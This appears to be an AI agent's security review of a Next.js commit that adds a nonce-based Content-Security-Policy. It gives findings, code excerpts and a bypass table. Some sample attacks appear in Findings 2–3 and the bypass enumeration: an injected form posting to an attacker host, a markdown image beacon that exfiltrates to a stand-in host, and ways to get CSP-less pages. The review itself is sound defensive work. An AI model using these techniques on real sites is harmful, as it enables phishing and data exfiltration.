Commit: d90d6bb

# Security Review — meta-formalism-copilot d86d2dc..d90d6bb (strict CSP via proxy.ts)

**Scope:** `git diff d86d2dc..d90d6bb` (`proxy.ts` new, `app/layout.tsx` modified), plus the callers and framework code named below
**Date:** 2026-11-19
**Based on:** merged code-fact-check report (k=3) at `runs/review-arms/a8-2026-11-20/csp/code-fact-check-report.md`. Framework behaviour was read from Next 16.2.4 at `/workspace/external/cc-review-eval/mfc-csp/node_modules/next` (same pinned version and HEAD; the reviewed worktree has no `node_modules`). No build, browser or Vercel run was possible.
**Threat model:** the reviewed repo has no constraints doc, so every attacker the diff exposes is in scope.

## Trust Boundary Map

```
B1 (new): [browser request: path + headers, S1/S2]       → [proxy matcher, proxy.ts:55-63]                          → [proxy runs (CSP set) | skipped (no CSP)]
B2 (new): [proxy nonce S3 + response CSP header]         → [router header copy resolve-routes.js:442-443 (next start); platform-specific elsewhere] → [app-render nonce read app-render.js:166-167 → nonce on <script>]
B3:       [LLM output S5, fetched from /api/* by the client] → [react-markdown, no rehype-raw; rehype-katex]          → [DOM, governed by the document's CSP]
B4 (new): [response CSP header, S3+S4]                   → [browser CSP enforcement]                                 → [script / style / img / connect / worker loads]
```

| Label | Source | Mutability | Trust (per sink class) |
|---|---|---|---|
| S1 | Incoming request headers (incl. any client-supplied `Content-Security-Policy`, `purpose`, `next-router-prefetch`) | request-time | UNTRUSTED for all sinks. It also decides whether the proxy runs at all (the `missing` clauses). |
| S2 | Request pathname | request-time | UNTRUSTED. It is the only input to the matcher regex. |
| S3 | Nonce `Buffer.from(crypto.randomUUID()).toString("base64")` | generated per request | Trusted for the header sink (base64 alphabet, no CRLF, no HTML escape characters). |
| S4 | CSP directive literals in `buildCsp` | code-constant | trusted |
| S5 | LLM output, user-derived (the content the CSP is meant to guard) | request-time / third-party | UNTRUSTED for HTML and script sinks |

The diff adds one boundary that matters: a browser-enforced policy (B4) whose script half only works if the nonce gets from the proxy into Next's renderer (B2). The proxy puts the CSP on the response only. Next reads the nonce from the *request* headers, so B2 holds only because the self-hosted router copies proxy response headers onto the request; this was read in code. Whether the proxy runs at all is decided by attacker-supplied path and headers (B1).

## Findings

#### 1. Nonce reaches Next only through a router side-effect; on hosts without that copy every script is blocked (E1)

**Severity:** Medium
**Location:** `proxy.ts:41-47`
**Boundary:** B2
**Move:** 1 (trust boundaries), 3 (error path)
**Confidence:** Medium. The `next start` path was read and works. Vercel's proxy-to-function header propagation is not visible from this repo and was not run.
**Legibility-target:** for-author

Evidence (`proxy.ts:41-47`, verbatim):
```ts
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set("x-nonce", nonce);

  const response = NextResponse.next({
    request: { headers: requestHeaders },
  });
  response.headers.set("Content-Security-Policy", buildCsp(nonce));
```
(excerpt ends :47; enclosing `proxy()` continues to :49 with `return response;` and was read)

Next takes the script nonce from the request's CSP header (`app-render.js:166`: `const csp = headers['content-security-policy'] || headers['content-security-policy-report-only'];`). The proxy sets `x-nonce` on the forwarded request, but nothing reads that header (fact-check Claim 13). It never sets `Content-Security-Policy` there. Under `next start` the request still works: `resolve-routes.js` first applies the request overrides (:396-421) and then copies every proxy response header onto `req.headers` (:442-443, `resHeaders[key] = value; req.headers[key] = value;`). On a host that applies proxy response headers only to the outgoing response, which is the commit body's untested Vercel target, Next gets no nonce. Its `<script>` tags then carry none, and `'strict-dynamic'` (with `'self'` ignored) blocks every bootstrap script. The app fails closed, so this is not an XSS hole. It is a whole-app outage that can only be seen in a real deployment, and the likely hotfix (drop the header, or add `'unsafe-inline'`) removes the guardrail. Next's own guide (`content-security-policy.md:70-73`) sets the CSP on `requestHeaders` too, and this diff leaves that line out.

**Recommendation:** add `requestHeaders.set("Content-Security-Policy", csp)` before `NextResponse.next(...)`, as the guide does. Then you no longer depend on the router copy. Gate the merge on a production-server smoke check that compares the response CSP nonce with the `nonce=` attributes in the HTML.

#### 2. Policy omits `form-action`; under the CSP's own premise an injected form can post to any origin

**Severity:** Low
**Location:** `proxy.ts:20-30`
**Boundary:** B3, B4
**Move:** 11 (bypass enumeration)
**Confidence:** High on the gap. Exploitability today is low, because no raw-HTML path exists (fact-check: no `rehype-raw`, no `dangerouslySetInnerHTML`).
**Legibility-target:** for-author

Evidence (`proxy.ts:20-30`, verbatim):
```ts
  const directives = [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self' data:",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "object-src 'none'",
  ];
```
(excerpt ends :30; enclosing `buildCsp()` continues to :32 with `return directives.join("; ");` and was read)

The stated threat is that someone later adds `rehype-raw` and LLM output becomes HTML. Under that premise, script execution is contained, but `form-action` does not fall back to `default-src`. Injected `<form action="https://attacker">` plus `'unsafe-inline'` styles is enough for a credential- or content-phishing overlay that posts out. Next's reference policy includes `form-action 'self'` (`content-security-policy.md:58`). This is rated Low and not Medium because the mechanism cannot be reached in the code as shipped; it becomes Medium the day raw HTML rendering lands.

**Recommendation:** add `"form-action 'self'"`. It costs nothing, because the app has no cross-origin form posts.

#### 3. Matcher sends some HTML documents without CSP: unanchored `api` prefix and the prefetch exemption (E5)

**Severity:** Low
**Location:** `proxy.ts:55-63`
**Boundary:** B1
**Move:** 5 (invert the access model), 11
**Confidence:** High that the paths are skipped. Low that any is exploitable today.
**Legibility-target:** for-author

Evidence (`proxy.ts:55-63`, verbatim):
```ts
  matcher: [
    {
      source: "/((?!api|_next/static|_next/image|favicon.ico).*)",
      missing: [
        { type: "header", key: "next-router-prefetch" },
        { type: "header", key: "purpose", value: "prefetch" },
      ],
    },
  ],
```
(excerpt ends :63; enclosing `config` continues to :64 with `};`)

The policy fails open per request: any request the matcher skips is served without CSP. Three request classes are skipped. (a) Any path beginning with the letters `api`, such as `/apiary` or `/api-docs`, not only `/api/`. (b) `/api/<missing>`: Next renders the root layout and the default not-found page as HTML, with no CSP. (c) Any request carrying `purpose: prefetch`. That header is client-chosen (S1), and browsers send it on `<link rel=prefetch>` document prefetches. Today no page route exists under an `api` prefix (route list: only `app/page.tsx` plus `app/api/**/route.ts`), and the default 404 page reflects no input, so nothing is exploitable now. But the exemption is silent. A future `app/api-explorer/page.tsx` that renders LLM output would ship with no CSP, and nothing would flag it. The pattern is copied from Next's guide (`content-security-policy.md:148`).

**Recommendation:** anchor the exclusion as `(?!api/|_next/static|_next/image|favicon\\.ico$)`. Add a proxy test that asserts `/apiary` and `/` both match (test-strategy's E6).

#### 4. `connect-src 'self'` blocks `fetch(data:)`, so graph PNG and export-all fail silently (E2)

**Severity:** Low (availability; not a confidentiality or integrity weakening)
**Location:** `app/lib/utils/exportGraph.ts:24,37` against `proxy.ts:26`
**Boundary:** B4
**Move:** 3 (error path)
**Confidence:** High (3/3 fact-check replicates; the rule is standard CSP: `fetch` is governed by `connect-src`, and `data:` is not covered by `'self'`)
**Legibility-target:** for-author

Evidence (`app/lib/utils/exportGraph.ts:20-26`, verbatim):
```ts
  const dataUrl = await toPng(viewportElement, {
    pixelRatio: 2,
    backgroundColor: EXPORT_BG,
  });
  const res = await fetch(dataUrl);
  const blob = await res.blob();
  triggerDownload(blob, filename);
```
(excerpt ends :26; enclosing `downloadGraphAsPng()` continues to :27 with `}`; `graphToPngBlob()` :30-39 has the same `fetch(dataUrl)` at :37, read)

The security angle is the fix direction. The tempting fix is to add `data:` to `connect-src`, and that should be avoided: it widens the fetch surface for every script. Convert in-process instead.

**Recommendation:** use `html-to-image`'s `toBlob` (same package, already a dependency), or decode the base64 data URL into a `Blob` directly. Leave `connect-src` as is.

#### 5. Comment rationales that steer future tightening the wrong way

**Severity:** Informational
**Location:** `proxy.ts:12-14`, `proxy.ts:35-36`, `app/layout.tsx:27-30`
**Boundary:** B2, B4
**Move:** 2 (implicit assumption)
**Confidence:** High (fact-check Claims 2, 3, 7, 11, 20; 3/3 replicates)
**Legibility-target:** for-author

Evidence (`proxy.ts:12-14`, verbatim):
```ts
 * Why `style-src 'unsafe-inline'`: Tailwind v4 emits inline styles. Tightening
 * to nonces would require rebuilding how Tailwind ships styles in dev and
 * SSR. Documented as a deliberate carve-out, not an oversight.
```
Evidence (`app/layout.tsx:28-30`, verbatim):
```ts
  // and can attach a fresh per-request CSP nonce. Next.js automatically tags
  // its own bootstrap <script> elements with the nonce from the response's
  // CSP header, so we don't need to read x-nonce here ourselves.
```

The layout comment says Next reads the nonce from the *response* header. It actually reads the request header (Finding 1), and that wrong model is exactly what would make someone "simplify" away the fix in Finding 1. The style carve-out names the wrong blocker. The real ones are about 30 React `style={}` attributes plus KaTeX and React Flow, and nonces cannot cover attributes at all. So the "tighten later" path the comment describes does not exist. The "Edge runtime" note at `proxy.ts:35-36` is also wrong (the proxy runs on Node.js), which matters if someone reasons about which crypto APIs are available.

**Recommendation:** rewrite all three comments to the mechanisms the fact-check verified.

#### 6. No violation reporting, so the "catches the regression" goal is invisible to maintainers

**Severity:** Informational
**Location:** `proxy.ts:20-31`
**Boundary:** B4
**Move:** 3
**Confidence:** High
**Legibility-target:** for-author

Evidence (`proxy.ts:31`, verbatim): `  return directives.join("; ");`

The commit body says the CSP "catches the regression" where raw HTML rendering is added later. The policy has no `report-to` or `report-uri` directive. A blocked injection is recorded only in the victim's browser console, so maintainers never see a regression that the CSP blocked, or a Finding-1-style outage.

**Recommendation:** add a `report-to` endpoint (or run a `Content-Security-Policy-Report-Only` twin for one release) if anyone will read the reports. Otherwise accept it as a known blind spot.

#### 7. Dev policy lacks `'unsafe-eval'`, and the pdf.js worker is unchecked under `'strict-dynamic'` (E4, E3)

**Severity:** Informational
**Location:** `proxy.ts:22`; `app/lib/utils/fileExtraction.ts:26`, `app/lib/utils/pdfPropositionParser.ts:443`
**Boundary:** B4
**Move:** 11
**Confidence:** Medium for dev (Next's guide, `content-security-policy.md:42`, says dev needs `'unsafe-eval'` for React's debug stacks). Low for the worker (not executed).
**Legibility-target:** for-author

Evidence (`proxy.ts:22`, verbatim): ``    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,``
Evidence (`app/lib/utils/fileExtraction.ts:26`, verbatim): `  pdfjsLib.GlobalWorkerOptions.workerSrc = new URL(`

Neither weakens production security. The dev gap degrades `next dev` error stacks, and the risk is a later "fix" that adds `'unsafe-eval'` unconditionally. Next's template gates it on `process.env.NODE_ENV === 'development'`. For the worker: there is no `worker-src`, so it falls back to `script-src`, where `'strict-dynamic'` disables `'self'`. Per CSP3, non-parser-inserted requests are allowed under `'strict-dynamic'`, and pdf.js falls back to a main-thread "fake worker" if construction fails. The likely failure is therefore slower PDF parsing, not a break. Browser behaviour was not checked.

**Recommendation:** add the guide's `isDev ? " 'unsafe-eval'" : ""` suffix. Add `worker-src 'self'` explicitly, and confirm PDF upload in a browser on the preview.

## Bypass enumeration (move 11)

Guardrail: the CSP policy plus its matcher.

| # | Candidate | Dispatch | Outcome |
|---|---|---|---|
| 1 | Path starting with `api` but not `/api/` (`/apiary`) | Tested (regex read + route list) | Skipped, no CSP. No such page exists today (Finding 3). |
| 2 | `/api/<nonexistent>` returns the HTML 404 | Tested (no `app/not-found.tsx`; default page) | HTML without CSP, no reflected input (Finding 3). |
| 3 | Client sends `purpose: prefetch` | Tested (matcher read) | Proxy skipped, document has no CSP (Finding 3). |
| 4 | Client supplies its own `Content-Security-Policy` request header to pick the nonce | Tested (`resolve-routes.js:396-443`, `app-render.js:166-167`) | On matched paths under `next start`, the proxy's response CSP overwrites it. On skipped paths Next uses the client's nonce, but only for the sender's own response, so there is no cross-user effect. |
| 5 | Injected `<form action=…>` (raw-HTML premise) | Tested (directive list) | Not blocked: no `form-action` (Finding 2). |
| 6 | Markdown image beacon `![](https://attacker/?d=…)` from LLM output | Tested (read-static: `img-src 'self' data: blob:`) | Blocked by policy as written. No browser run, and react-markdown's default `urlTransform` was not read. |

### Untested bypass candidates

- **Browser reuse of a CSP-less prefetched document for navigation** (from candidate 3). Whether Chrome or Firefox reuse a `<link rel=prefetch>` document response, served dynamic and probably `no-store`, for a later top-level navigation. Not tested: needs a browser.
- **Nonce theft via dangling markup or CSS under `'unsafe-inline'` styles.** Browsers hide the `nonce` attribute from selectors and `getAttribute`. Not tested: needs a browser and a raw-HTML premise that does not exist today.
- **`'strict-dynamic'` script gadgets.** A nonced library script that builds `<script src>` from DOM data the attacker controls would pass trust on to that script. Not tested: the bundled libraries (React Flow, KaTeX, html-to-image) were not audited for gadgets.
- **Vercel header propagation (B2).** Whether the response CSP reaches the render request on Vercel. Not tested: no platform access (Finding 1).

Because these remain open, the CSP guardrail itself does not appear in Endorsement Claims.

## Endorsement Claims

- **Claim:** The nonce comes from a CSPRNG (`crypto.randomUUID`, 122 random bits) and is regenerated on every proxy invocation. Its base64 alphabet contains none of the characters Next rejects (`getScriptNonceFromHeader`, `ESCAPE_REGEX`).
  **Location:** `proxy.ts:37`
  **Evidence:** read-static
  **Verified:** `proxy.ts:37` and `get-script-nonce-from-header.js:12-42`, read.
  **Not verified:** whether any CDN or edge cache stores the dynamic HTML response, which would replay one nonce to many users. That depends on the `Cache-Control` actually emitted in deployment.
  **route: code-fact-check**

- **Claim:** The OpenRouter and Anthropic calls that `proxy.ts:16-17` names run in server modules (`app/lib/llm/callLlm.ts` and `streamLlm.ts` import Node `crypto` and read `process.env.*_API_KEY`), and the modules that import them are API routes, not client components. This supports the `connect-src 'self'` premise for LLM traffic.
  **Location:** `app/lib/llm/callLlm.ts:1-3,112-113`, `app/lib/llm/streamLlm.ts:1-3,87-88`
  **Evidence:** read-static
  **Verified:** `rg` of the import sites (`app/api/**/route.ts`, `app/lib/formalization/artifactRoute.ts`). Each client-side `fetch(` outside `app/api` targets `/api/*` or a `data:` URL.
  **Not verified:** the built client bundle, which would show whether any client chunk pulls in `callLlm`. `app/lib/formalization/api.ts` imports only the type.
  **route: code-fact-check**

## Primitive sweep

Primitive: HTTP header construction from interpolated values (header injection)
| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `proxy.ts:22` (nonce interpolated into CSP string) | S3 | base64 of UUID, code-generated | cleared: no CRLF or quote is possible |
| `proxy.ts:42` `requestHeaders.set("x-nonce", nonce)` | S3 | same | cleared. Dead value: nothing reads it (fact-check Claim 13). |
| `proxy.ts:47` `response.headers.set("Content-Security-Policy", ...)` | S3 + S4 | same | cleared (correctness gap: Finding 1) |

Primitive: client-side URL fetch (no new site in the diff scope; swept because the policy governs it)
| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `app/lib/utils/exportGraph.ts:24` | `data:` URL from `toPng` (code-generated) | none needed | Finding 4 (blocked by connect-src) |
| `app/lib/utils/exportGraph.ts:37` | same | none needed | Finding 4 |
| `app/components/features/context-input/ContextInput.tsx:25`, `app/components/features/lean-display/LeanCodeDisplay.tsx:88`, `app/lib/formalization/api.ts:10,38,104`, `app/hooks/useAnalytics.ts:11,30` | code-constant `/api/*` paths | same-origin | cleared: allowed by `connect-src 'self'` |

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence |
|---|---------|----------|----------|----------|------------|
| 1 | CSP not set on forwarded request headers; nonce delivery relies on the router copy; whole-app outage on hosts without it | Medium | B2 | `proxy.ts:41-47` | Medium |
| 2 | No `form-action`; injected forms can post cross-origin under the raw-HTML premise | Low | B3, B4 | `proxy.ts:20-30` | High |
| 3 | Matcher serves CSP-less HTML for `api*` paths, `/api/<missing>` and `purpose: prefetch` | Low | B1 | `proxy.ts:55-63` | High |
| 4 | `connect-src 'self'` breaks `fetch(data:)` in graph export; fix in code, not by widening connect-src | Low | B4 | `app/lib/utils/exportGraph.ts:24,37` | High |
| 5 | Comments misstate nonce source, style blocker and runtime | Informational | B2, B4 | `proxy.ts:12-14,35-36`; `app/layout.tsx:27-30` | High |
| 6 | No `report-to`; blocked regressions are invisible to maintainers | Informational | B4 | `proxy.ts:20-31` | High |
| 7 | No dev-only `'unsafe-eval'`; pdf.js worker under `'strict-dynamic'` unchecked | Informational | B4 | `proxy.ts:22`; `fileExtraction.ts:26`; `pdfPropositionParser.ts:443` | Medium / Low |

## Overall Assessment

The change does not weaken the app's security. Every failure mode found fails closed, or affects only requests that carry no attacker content today. The policy itself is a sound strict-nonce baseline. The most important problem is Finding 1. Because the CSP is never put on the forwarded request, the nonce reaches Next only through a self-hosted router side-effect. On the unverified Vercel target that is plausibly a total script block, and the obvious hotfix for it is to remove the guardrail. One added line, the one Next's guide already has, fixes it, and a production-server nonce smoke check should gate the merge. After that, add `form-action 'self'`, anchor the `api/` exclusion, and fix the export code rather than widening `connect-src`. All of these can be fixed in place; none is an architectural problem. The bypass candidates above are still untested, so this review gives no categorical all-clear: no exploitable findings within the code paths read; endorsement claims pending execution verification.

## Goal-Alignment Note
- Success criterion (restated verbatim): A markdown report saved to the output path below, with `Commit: d90d6bb` as its first line, structured per the security-reviewer skill.
- Answered: yes
- Out of scope: browser, `next build` and Vercel execution (no node_modules in the worktree, no network). Gadget audit of bundled libraries. Test design (test-strategy owns E6).
- Escalate: (1) a production-server smoke check, plus a Vercel preview check, that the response CSP nonce matches the HTML `<script nonce>` values, since this decides Finding 1. (2) Browser check of PDF upload and graph PNG export on the preview (Findings 4 and 7). (3) The two routed endorsement claims to code-fact-check.
- Decisions I made: rated Finding 1 Medium although it fails closed, because it is a deployment-only whole-app outage whose obvious fix removes the control. Kept Finding 2 at Low under the floor rule, because the mechanism needs a raw-HTML path that cannot be reached in shipped code. Used the sibling Next 16.2.4 install for framework reads, as the fact-check replicates did.
